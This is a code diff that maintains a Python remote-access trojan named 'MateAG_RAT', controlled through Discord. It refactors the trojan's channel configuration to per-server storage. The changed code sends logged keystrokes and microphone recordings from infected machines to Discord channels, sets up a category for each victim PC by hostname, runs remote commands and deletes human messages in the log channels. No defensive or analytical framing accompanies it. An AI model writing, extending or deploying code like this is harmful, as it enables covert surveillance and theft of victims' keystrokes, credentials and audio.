@@ -144,7 +144,7 @@ intents.voice_states = True
 
 bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)
 
-BASE_DIR = os.path.join(os.environ["TEMP"], "MateAG_RAT")
+BASE_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "MateAG_RAT")
 DB_PATH = os.path.join(BASE_DIR, "data.db")
 ICON_PATH = os.path.join(BASE_DIR, "icon.png")
 
@@ -347,7 +347,7 @@ def send_keys_periodically():
 
 async def send_keylog_to_discord(text):
     for guild in bot.guilds:
-        keys_ch = guild.get_channel(CHANNEL_IDS.get("keys"))
+        keys_ch = guild.get_channel(cfg_get(guild.id, "keys"))
         if keys_ch:
             for chunk in [text[i:i + 1900] for i in range(0, len(text), 1900)]:
                 await keys_ch.send(f"```\n{chunk}\n```")
@@ -378,7 +378,7 @@ def record_mic_thread():
 
 async def send_recording(filename):
     for guild in bot.guilds:
-        mic_ch = guild.get_channel(CHANNEL_IDS.get("microphone"))
+        mic_ch = guild.get_channel(cfg_get(guild.id, "microphone"))
         if mic_ch:
             try:
                 await mic_ch.send(file=discord.File(filename))
@@ -547,48 +547,38 @@ def flash_screen(effect):
         time.sleep(10)
         win32gui.DeleteDC(hdc)
 
+CATEGORY_IDS = {}
+CHANNEL_IDS = {}
+
 
 def init_channels_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("CREATE TABLE IF NOT EXISTS channel_config (key TEXT PRIMARY KEY, channel_id INTEGER)")
-    c.execute("CREATE TABLE IF NOT EXISTS category_config (key TEXT PRIMARY KEY, category_id INTEGER)")
+    c.execute("""CREATE TABLE IF NOT EXISTS guild_config
+                 (guild_id INTEGER, key TEXT, value INTEGER, PRIMARY KEY (guild_id, key))""")
     conn.commit()
     conn.close()
 
 
-def get_channel_id(key):
+def get_guild_value(guild_id, key):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT channel_id FROM channel_config WHERE key = ?", (key,))
+    c.execute("SELECT value FROM guild_config WHERE guild_id = ? AND key = ?", (guild_id, key))
     result = c.fetchone()
     conn.close()
     return result[0] if result else None
 
 
-def set_channel_id(key, channel_id):
+def set_guild_value(guild_id, key, value):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO channel_config VALUES (?, ?)", (key, channel_id))
+    c.execute("INSERT OR REPLACE INTO guild_config VALUES (?, ?, ?)", (guild_id, key, value))
     conn.commit()
     conn.close()
 
 
-def get_category_id():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT category_id FROM category_config WHERE key = 'main'")
-    result = c.fetchone()
-    conn.close()
-    return result[0] if result else None
-
-
-def set_category_id(category_id):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO category_config VALUES (?, ?)", ("main", category_id))
-    conn.commit()
-    conn.close()
+def cfg_get(guild_id, key, default=None):
+    return CHANNEL_IDS.get(guild_id, {}).get(key, default)
 
 
 init_db()
@@ -599,16 +589,6 @@ CHANNEL_NAMES = {
     "cmds": "🤖〡cmds",
     "keys": "🔑〡keys",
     "microphone": "🎤〡microphone",
-    "livemic": "Live microphone",
-}
-
-CATEGORY_ID = get_category_id()
-CHANNEL_IDS = {
-    "panel": get_channel_id("panel"),
-    "cmds": get_channel_id("cmds"),
-    "keys": get_channel_id("keys"),
-    "microphone": get_channel_id("microphone"),
-    "livemic": get_channel_id("livemic"),
 }
 
 
@@ -617,7 +597,7 @@ async def run_panel_command(interaction: discord.Interaction, command_name: str,
     if not cmd:
         await interaction.response.send_message(f"Unknown command: `{command_name}`", ephemeral=True)
         return
-    cmds_channel = interaction.guild.get_channel(CHANNEL_IDS["cmds"])
+    cmds_channel = interaction.guild.get_channel(cfg_get(interaction.guild.id, "cmds"))
     if not cmds_channel:
         await interaction.response.send_message("Commands channel not found", ephemeral=True)
         return
@@ -839,8 +819,6 @@ class ButtonsMore(_PanelView):
 async def on_ready():
     print(f"Connected as {bot.user}")
 
-    global CATEGORY_ID, CHANNEL_IDS
-
     pc_name = socket.gethostname()
     category_name = f"💻 〣 {pc_name}"
 
@@ -850,31 +828,27 @@ async def on_ready():
     )
 
     for guild in bot.guilds:
-        existing_category = get_category_id()
-        if existing_category:
-            cat = guild.get_channel(existing_category)
-            if not cat:
-                CATEGORY_ID = None
-                CHANNEL_IDS = {k: None for k in CHANNEL_IDS}
+        gid = guild.id
+        CHANNEL_IDS.setdefault(gid, {})
 
-        if CATEGORY_ID is None:
+        cat_id = get_guild_value(gid, "category")
+        cat = guild.get_channel(cat_id) if cat_id else None
+        if not cat:
             cat = discord.utils.get(guild.categories, name=category_name)
             if not cat:
                 cat = await guild.create_category(category_name)
-            CATEGORY_ID = cat.id
-            set_category_id(CATEGORY_ID)
-        else:
-            cat = guild.get_channel(CATEGORY_ID)
+        CATEGORY_IDS[gid] = cat.id
+        set_guild_value(gid, "category", cat.id)
 
         for key, name in CHANNEL_NAMES.items():
-            if CHANNEL_IDS[key] is None:
+            ch_id = get_guild_value(gid, key)
+            ch = guild.get_channel(ch_id) if ch_id else None
+            if not ch:
                 ch = discord.utils.get(cat.text_channels, name=name)
                 if not ch:
                     ch = await guild.create_text_channel(name, category=cat)
-                CHANNEL_IDS[key] = ch.id
-                set_channel_id(key, ch.id)
-            else:
-                ch = guild.get_channel(CHANNEL_IDS[key])
+            CHANNEL_IDS[gid][key] = ch.id
+            set_guild_value(gid, key, ch.id)
 
             if key == "panel" and ch:
                 try:
@@ -890,15 +864,15 @@ async def on_ready():
                 pass
 
         if voice_ch:
-            CHANNEL_IDS["livemic"] = voice_ch.id
-            set_channel_id("livemic", voice_ch.id)
+            CHANNEL_IDS[gid]["livemic"] = voice_ch.id
+            set_guild_value(gid, "livemic", voice_ch.id)
 
-        keys_ch = guild.get_channel(CHANNEL_IDS["keys"])
+        keys_ch = guild.get_channel(cfg_get(gid, "keys"))
         if keys_ch:
             timestamp = datetime.now().strftime("[%Y-%m-%d] [%H:%M:%S]")
             await keys_ch.send(f"{timestamp} Started new session on {pc_name}")
 
-        panel_ch = guild.get_channel(CHANNEL_IDS["panel"])
+        panel_ch = guild.get_channel(cfg_get(gid, "panel"))
         if panel_ch:
             def mk(title, desc, color, fields):
                 e = create_embed(title, desc, color)
@@ -1215,8 +1189,7 @@ async def join(ctx):
 
     guild = ctx.guild
 
-    livemic_id = CHANNEL_IDS.get("livemic")
-    vc = guild.get_channel(livemic_id) if livemic_id else None
+    vc = guild.get_channel(cfg_get(guild.id, "livemic"))
 
     if not vc:
         await ctx.send(embed=create_embed("Error", "Channel **Live microphone** not found.", 0xff0000))
@@ -2449,9 +2422,11 @@ async def on_message(message):
     if isinstance(message.channel, discord.DMChannel):
         return
 
+    gid = message.guild.id
+    chans = CHANNEL_IDS.get(gid, {})
     channel_id = message.channel.id
 
-    if channel_id in (CHANNEL_IDS.get("keys"), CHANNEL_IDS.get("microphone")):
+    if channel_id in (chans.get("keys"), chans.get("microphone")):
         if not message.author.bot:
             try:
                 await message.delete()
@@ -2459,10 +2434,10 @@ async def on_message(message):
                 pass
         return
 
-    if CATEGORY_ID is None or message.channel.category_id != CATEGORY_ID:
+    if CATEGORY_IDS.get(gid) is None or message.channel.category_id != CATEGORY_IDS.get(gid):
         return
 
-    if channel_id == CHANNEL_IDS.get("cmds"):
+    if channel_id == chans.get("cmds"):
         await bot.process_commands(message)
         return
 
